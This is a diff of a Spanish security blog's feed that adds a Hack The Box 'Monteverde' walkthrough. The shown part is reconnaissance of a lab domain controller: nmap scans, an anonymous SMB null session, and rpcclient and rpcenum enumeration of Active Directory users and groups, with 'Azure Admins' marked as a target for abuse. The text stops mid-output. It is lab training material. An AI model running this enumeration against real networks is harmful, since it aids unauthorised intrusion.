@@ -1,4 +1,673 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-15T16:41:38-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Nest</title><link href="http://localhost:4000/htb-nest/" rel="alternate" type="text/html" title="Hack The Box Nest" /><published>2022-01-15T00:00:00-06:00</published><updated>2022-01-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-nest</id><content type="html" xml:base="http://localhost:4000/htb-nest/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nest/banner-nest.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-15T19:38:44-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Monteverde</title><link href="http://localhost:4000/htb-monteverde/" rel="alternate" type="text/html" title="Hack The Box Monteverde" /><published>2022-01-15T00:00:00-06:00</published><updated>2022-01-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-monteverde</id><content type="html" xml:base="http://localhost:4000/htb-monteverde/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-monteverde/banner-monteverde.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;monteverde&quot;&gt;Monteverde&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.172.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.172
+PING 10.10.10.172 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.172&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.172: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.172 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.923/136.923/136.923/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 16:52 CST
+Initiating SYN Stealth Scan at 16:52        
+Scanning 10.10.10.172 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]          
+Discovered open port 53/tcp on 10.10.10.172   
+Discovered open port 139/tcp on 10.10.10.172  
+Discovered open port 445/tcp on 10.10.10.172  
+Discovered open port 135/tcp on 10.10.10.172  
+Discovered open port 636/tcp on 10.10.10.172 
+Discovered open port 3268/tcp on 10.10.10.172
+Discovered open port 49674/tcp on 10.10.10.172
+Discovered open port 49673/tcp on 10.10.10.172
+Discovered open port 49693/tcp on 10.10.10.172
+Discovered open port 49676/tcp on 10.10.10.172
+Discovered open port 9389/tcp on 10.10.10.172
+Discovered open port 593/tcp on 10.10.10.172
+Discovered open port 49667/tcp on 10.10.10.172                                                                                   
+Discovered open port 5985/tcp on 10.10.10.172
+Discovered open port 389/tcp on 10.10.10.172  
+Discovered open port 3269/tcp on 10.10.10.172
+Discovered open port 88/tcp on 10.10.10.172      
+Discovered open port 464/tcp on 10.10.10.172                                                                                     
+Completed SYN Stealth Scan at 16:52, 26.44s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.172               
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
+Scanned at 2022-01-15 16:52:04 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s      
+Not shown: 65517 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49693/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.52 seconds
+           Raw packets sent: 131064 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.767MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 30 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.320KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.172
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 16:53 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.172
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-01-15 22:53:31Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-15T22:54:26
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;101.32 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 445 abierto, así que trataremos de conectarnos a través de una &lt;strong&gt;&lt;em&gt;Null Session&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+Anonymous login successful
+
+        Sharename       Type      Comment
+        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.10.172
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: 10.10.10.172
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, así que ahora vamos a tratar de ocupar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; para ver si podemos conectarnos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos la capacidad de obtener información de &lt;strong&gt;Active Directory&lt;/strong&gt; y para facilitarnos las cosas, haremos uso de la herramienta &lt;a href=&quot;https://github.com/s4vitar/rpcenum&quot;&gt;rpcenum&lt;/a&gt; para dumpear la información que nos interesa.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uso: rpcenum
+
+        e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Enumeration Mode
+
+                DUsers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Users&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                DUsersInfo &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Users with info&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                DAUsers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Admin Users&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                DGroups &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Groups&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                All &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;All Modes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+        i&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Host IP Address
+
+        h&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;pannel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain Users&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DUsers &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Users...
+
+  +                   +
+  | Users             |
+  +                   +
+  | Guest             |
+  | AAD_987d7f2f57d2  |
+  | mhope             |
+  | SABatchJobs       |
+  | svc-ata           |
+  | svc-bexec         |
+  | svc-netapp        |
+  | dgalanos          |
+  | roleary           |
+  | smorgan           |
+  +                   +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain Users with info&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DUsersInfo &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Listing domain &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;with description...
+
+  +                   +                                                                                                                                                    +
+  | User              | Description                                                                                                                                        |
+  +                   +                                                                                                                                                    +
+  | Guest             | Built-in account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;guest access to the computer/domain                                                                                           |
+  | AAD_987d7f2f57d2  | Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.  |
+  +                   +                                                                                                                                                    +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain Admin Users&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DAUsers &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Admin Users...
+
+  +                   +
+  | DomainAdminUsers  |
+  +                   +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain Groups&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DGroups &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Groups...
+
+  +                                          +                                                                                                                   +
+  | DomainGroup                              | Description                                                                                                       |
+  +                                          +                                                                                                                   +
+  | Enterprise Read-only Domain Controllers  | Members of this group are Read-Only Domain Controllers &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the enterprise                                          |
+  | Domain Users                             | All domain &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;                                                                                                  |
+  | Domain Guests                            | All domain guests                                                                                                 |
+  | Domain Computers                         | All workstations and servers joined to the domain                                                                 |
+  | Group Policy Creator Owners              | Members &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this group can modify group policy &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the domain                                                      |
+  | Cloneable Domain Controllers             | Members of this group that are domain controllers may be cloned.                                                  |
+  | Protected Users                          | Members of this group are afforded additional protections against authentication security threats. See http       |
+  | DnsUpdateProxy                           | DNS clients &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are permitted to perform dynamic updates on behalf of some other clients &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;such as DHCP servers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  |
+  | Azure Admins                             |                                                                                                                   |
+  | File Server Admins                       |                                                                                                                   |
+  | Call Recording Admins                    |                                                                                                                   |
+  | Reception                                |                                                                                                                   |
+  | Operations                               |                                                                                                                   |
+  | Trading                                  |                                                                                                                   |
+  | HelpDesk                                 |                                                                                                                   |
+  | Developers                               |                                                                                                                   |
+  +                                          +                                                                                                                   +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con la información que tenemos, ya debemos ver un grupo del cual podriamos abusar &lt;strong&gt;Azure Admins&lt;/strong&gt; ya que como buen atacante vamos a ir por la administración del dominio y comprometer los equipos; por lo tanto, vamos a ver que usuarios pertenecen a dicho grupo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Azure Admins] rid:[0xa29]
+group:[File Server Admins] rid:[0xa2e]
+group:[Call Recording Admins] rid:[0xa2f]
+group:[Reception] rid:[0xa30]
+group:[Operations] rid:[0xa31]
+group:[Trading] rid:[0xa32]
+group:[HelpDesk] rid:[0xa33]
+group:[Developers] rid:[0xa34]
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; querygroupmem 0xa29
+        rid:[0x1f4] attr:[0x7]
+        rid:[0x450] attr:[0x7]
+        rid:[0x641] attr:[0x7]
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x1f4                                                                                                     
+result was NT_STATUS_ACCESS_DENIED                                                                                               
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x450                                                                                                     
+        User Name   :   AAD_987d7f2f57d2                                                                                         
+        Full Name   :   AAD_987d7f2f57d2                                                                                         
+        Home Drive  :                                                                                                            
+        Dir Drive   :      
+        Profile Path:        
+        Logon Script:        
+        Description :   Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309a
+dfc172d9 running on computer MONTEVERDE.
+        Workstations:      
+        Comment     :                                           
+        Remote Dial :                                           
+        Logon Time               :      sáb, 15 ene 2022 16:53:30 CST
+        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
+        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
+        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 16:53:25 CST
+        Password can change Time :      vie, 03 ene 2020 16:53:25 CST
+        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
+        unknown_2[0..31]...
+        user_rid :      0x450
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000000a
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x641
+        User Name   :   mhope
+        Full Name   :   Mike Hope
+        Home Drive  :   &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;monteverde&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope
+        Dir Drive   :   H:
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      vie, 03 ene 2020 07:29:59 CST
+        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
+        Kickoff Time             :      mié, 13 sep 30828 21:48:05 CDT
+        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 17:40:06 CST
+        Password can change Time :      vie, 03 ene 2020 17:40:06 CST
+        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
+        unknown_2[0..31]...
+        user_rid :      0x641
